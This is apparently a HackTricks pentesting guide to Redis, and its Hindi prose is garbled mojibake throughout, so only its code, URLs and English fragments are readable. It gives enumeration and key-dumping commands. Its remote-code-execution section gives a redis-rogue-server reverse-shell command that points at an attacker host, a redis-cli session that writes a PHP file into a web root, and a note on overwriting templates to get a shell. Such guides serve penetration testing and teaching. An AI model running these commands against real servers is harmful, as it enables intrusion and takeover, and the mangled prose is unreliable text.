# 6379 - рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рд░реЗрдбрд┐рд╕

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рд╣рдореЗрдВ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдЬрдорд╛ рдХрд░реЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреА рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдХрджрдо рд╕реЗ рдХрджрдо рд░рд╣реЗрдВ рдЕрдкрдбреЗрдЯреЗрдб

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ](https://redis.io/topics/introduction): Redis рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ (рдмреАрдПрд╕рдбреА рд▓рд╛рдЗрд╕реЗрдВрд╕), рдЗрди-рдореЗрдореЛрд░реА **рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рд╕реНрдЯреЛрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рдбреЗрдЯрд╛рдмреЗрд╕**, рдХреИрд╢ рдФрд░ рд╕рдВрджреЗрд╢ рдмреНрд░реЛрдХрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реЗрдбрд┐рд╕ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдПрдХ рдкреНрд▓реЗрди-рдЯреЗрдХреНрд╕реНрдЯ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдпрд╣ **ssl/tls** рднреА рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рд╕реЗ [Redis рдХреЛ ssl/tls рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛ рд╕реАрдЦреЗрдВ](https://fossies.org/linux/redis/TLS.md)ред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛

рдХреБрдЫ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рдЬреЛ рдПрдХ рд░реЗрдбрд┐рд╕ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## рдореИрдиреБрдЕрд▓ рдЬрд╛рдВрдЪ

### рдмреИрдирд░

рд░реЗрдбрд┐рд╕ рдПрдХ **рдЯреЗрдХреНрд╕реНрдЯ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓** рд╣реИ, рдЖрдк **рд╕реЙрдХреЗрдЯ рдореЗрдВ рдХрдорд╛рдВрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдорд╛рди рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рд░реЗрдбрд┐рд╕ **ssl/tls** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ (рд▓реЗрдХрд┐рди рдпрд╣ рдмрд╣реБрдд рдЕрдЬреАрдм рд╣реИ)ред

рд╕рд╛рдорд╛рдиреНрдп рд░реЗрдбрд┐рд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рд╕рд┐рд░реНрдл `nc` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк `redis-cli` рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
**рдкрд╣рд▓рд╛ рдХрдорд╛рдВрдб** рдЬреЛ рдЖрдк рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **`info`**ред рдпрд╣ Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдЖрдЙрдЯрдкреБрдЯ рд╡рд╛рдкрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╡рд╛рдкрд╕ рдЖ рд╕рдХрддрд╛ рд╣реИ:
```
-NOAUTH Authentication required.
```
### рд░реЗрдбрд┐рд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ** рд░реЗрдбрд┐рд╕ рдХреЛ **рдкрд╣реБрдВрдЪрд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреЛрдВ** рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ **рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рдкрд╛рд╕рд╡рд░реНрдб** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЖрдк _**redis.conf**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `requirepass` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рд╕реЗрд╡рд╛ рдкреБрдирдГ рдЖрд░рдВрдн рд╣реЛрдиреЗ рддрдХ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЗрд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдХреЗ рдФрд░ рдЪрд▓рд╛рдХрд░: `config set requirepass p@ss$12E45`ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, _**redis.conf**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `masteruser` рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="info" %}
рдЕрдЧрд░ рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо "**рдбрд┐рдлрд╝реЙрд▓реНрдЯ**" рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ рдкрддрд╛ рдирд╣реАрдВ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд░реЗрдбрд┐рд╕ рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
{% endhint %}

рдЗрд╕ рддрд░рд╣ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рд░реЗрдбрд┐рд╕ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрдЧреА, рддрд╛рдХрд┐ рдЖрдк рдЗрд╕реЗ [**рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕**](../generic-methodologies-and-resources/brute-force.md#redis) рдХрд░ рд╕рдХреЗрдВред\
**рдпрджрд┐ рдЖрдк рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдг рдкрддрд╛ рд▓рдЧрд╛ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рд╕рддреНрд░ рдХрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрдЧреА рдЬрдм рдЖрдк рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ:
```bash
AUTH <username> <password>
```
**рдорд╛рдиреНрдп рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХрд╛ рдЬрд╡рд╛рдм рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛: `+OK`

### **рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЬрд╛рдВрдЪ**

рдпрджрд┐ Redis рд╕рд░реНрд╡рд░ **рдЕрдирд╛рдо рд╕рдВрдпреЛрдЬрди** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ рдЖрдкрдиреЗ рдорд╛рдиреНрдп рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **рдХрдорд╛рдВрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**рдЕрдиреНрдп Redis рдХрдорд╛рдВрдб** [**рдпрд╣рд╛рдБ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://redis.io/topics/data-types-intro) **рдФрд░** [**рдпрд╣рд╛рдБ**](https://lzone.de/cheat-sheet/Redis)**ред**

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ Redis рдХрдорд╛рдВрдб рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд** рдпрд╛ _redis.conf_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрд╣ рд▓рд╛рдЗрди FLUSHDB рдХрдорд╛рдВрдб рдХреЛ рд╣рдЯрд╛ рджреЗрдЧреА:
```
rename-command FLUSHDB ""
```
рдПрдХ Redis рд╕реЗрд╡рд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рд╣реИ: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рднреА **рд░реАрдбрд┐рд╕ рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рдореЙрдирд┐рдЯрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдорд╛рдВрдб **`monitor`** рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ рдпрд╛ **25 рд╕рдмрд╕реЗ рдзреАрдореЗ рдХреНрд╡реЗрд░реА** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`slowlog get 25`**

рдЕрдзрд┐рдХ рд░реАрдбрд┐рд╕ рдХрдорд╛рдВрдбреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рдкрд╛рдПрдВ: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдбрдВрдк**

рд░реАрдбрд┐рд╕ рдореЗрдВ **рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рдВрдЦреНрдпрд╛рдПрдБ 0 рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ**ред рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдХрдорд╛рдВрдб `info` рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ "Keyspace" рдЪрдВрдХ рдореЗрдВ:

![](<../.gitbook/assets/image (315).png>)

рдпрд╛ рдЖрдк рд╕реАрдзреЗ рд╕рднреА **рдХреАрд╕реНрдкреЗрд╕реЗрд╕** (рдбреЗрдЯрд╛рдмреЗрд╕) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
INFO keyspace
```
рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдФрд░ 1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред **рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдореЗрдВ 4 рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╣реИрдВ рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ 1 рдореЗрдВ 1 рд╣реИ**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Redis рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд╛рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛рдмреЗрд╕ 1 рдХреЗ рд▓рд┐рдП рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
рдпрджрд┐ рдЖрдк `GET <KEY>` рдЪрд▓рд╛рддреЗ рд╕рдордп `-WRONGTYPE Operation against a key holding the wrong kind of value` рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреБрдВрдЬреА рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдпрд╛ рдкреВрд░реНрдгрд╛рдВрдХ рд╕реЗ рднрд┐рдиреНрди рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рдСрдкрд░реЗрдЯрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдХреБрдВрдЬреА рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП, `TYPE` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдиреАрдЪреЗ рд╕реВрдЪреА рдФрд░ рд╣реИрд╢ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **рдпрд╛ рдкрд╛рдпрдерди** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рдиреНрдпреВрдЬрд╝ рдФрд░ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреЗ рд╕рдВрд╕рд╛рд░ рдореЗрдВ рдЕрджреНрдпрддрди рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## Redis RCE

### рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ Redis(<=5.0.5) рдореЗрдВ рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓ рдпрд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP рд╡реЗрдмрд╢реЗрд▓

рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ рд╕реЗ**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)ред рдЖрдкрдХреЛ **рд╡реЗрдмрд╕рд╛рдЗрдЯ рдлрд╝реЛрд▓реНрдбрд░** рдХрд╛ **рдкрде** рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
рдпрджрд┐ рд╡реЗрдмрд╢реЗрд▓ рдПрдХреНрд╕реЗрд╕ рдЕрд╕рдлрд▓ рд╣реЛ рдЬрд╛рдП, рддреЛ рдЖрдк рдмреИрдХрдЕрдк рдХреЗ рдмрд╛рдж рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЦрд╛рд▓реА рдХрд░рдХреЗ рдлрд┐рд░ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ред

### рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡реЗрдмрд╢реЗрд▓

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рдХреА рддрд░рд╣, рдЖрдк рдХрд┐рд╕реА рдПрдЪрдЯреАрдПрдордПрд▓ рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рдХ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

